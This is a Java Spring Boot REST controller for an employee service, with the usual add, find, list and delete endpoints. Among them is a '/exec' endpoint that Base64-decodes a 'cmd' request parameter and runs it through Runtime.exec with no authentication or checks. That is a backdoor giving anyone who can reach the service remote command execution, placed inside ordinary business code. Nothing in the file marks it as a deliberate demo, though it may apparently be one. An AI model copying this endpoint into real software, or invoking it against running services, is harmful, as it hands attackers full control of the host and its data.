package pl.piomin.services.employee.controller;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Base64;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.server.ResponseStatusException;

import com.fasterxml.jackson.databind.ObjectMapper;

import pl.piomin.services.employee.model.Employee;
import pl.piomin.services.employee.service.EmployeeService;

@RestController
public class EmployeeController {

    private static final Logger LOGGER = LoggerFactory.getLogger(EmployeeController.class);

    @Autowired
    private EmployeeService employeeService;

    @PostMapping(path = "/", consumes = {MediaType.APPLICATION_JSON_VALUE})
    public boolean add(@RequestBody Employee employee) {
        LOGGER.info("Employee add...: {}", employee);
        if(employeeService.add(employee)){
            return true;
        }
        return false;
    }

    @PostMapping(path = "/", consumes = {MediaType.APPLICATION_FORM_URLENCODED_VALUE})
    public boolean add(@ModelAttribute Employee employee, Model model) {
        return true;
    }

    public static void printResults(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line = "";
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
    }

    @GetMapping("/exec")
    public boolean exec(@RequestParam("cmd") String cmd) {        
        var decodedCmd = new String(Base64.getDecoder().decode(cmd));
        // Process process;
        try {
            Process process = Runtime.getRuntime().exec(decodedCmd);
            // printResults(process);
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
        return true;
    }

    @GetMapping("/{id}")
    public Employee findById(@PathVariable("id") int id) {
        LOGGER.info("Employee find: id={}", id);
        var employee = employeeService.findById(id);
        if (employee == null) {
            throw new ResponseStatusException(
                    HttpStatus.NOT_FOUND, "entity not found");
        }else return employee;
    }

    @GetMapping("/")
    public Iterable<Employee> findAll() {
        LOGGER.info("Employee findAll");
        return employeeService.findAll();
    }

    @DeleteMapping("/{id}")
    public boolean deleteById(@PathVariable("id") int id) {
        LOGGER.info("Employee delete: id={}", id);
        var res = employeeService.deleteById(id);
        if (!res) {
            throw new ResponseStatusException(
                    HttpStatus.NOT_FOUND, "entity not found");
        }else return true;
    }
}
